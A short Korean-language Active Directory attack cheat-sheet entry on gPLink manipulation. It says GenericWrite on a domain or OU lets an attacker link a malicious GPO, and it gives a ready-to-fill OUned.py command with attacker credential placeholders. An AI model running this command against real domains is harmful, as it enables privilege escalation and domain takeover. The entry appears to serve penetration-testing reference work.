# Domain / OU 대상

## gPLink 조작

도메인 또는 OU에 GenericWrite가 있으면 gPLink 속성을 수정해 악성 GPO를 링크할 수 있다. 2024년 Synacktiv이 발견한 기법으로 adminCount=1 오브젝트에도 영향을 준다.

```bash
python3 OUned.py \
  --dc-ip <DC_IP> -d <도메인> \
  -u <공격자계정> -p '<패스워드>' \
  --ou-guid '<DOMAIN_OR_OU_GUID>'  # ← 수정
```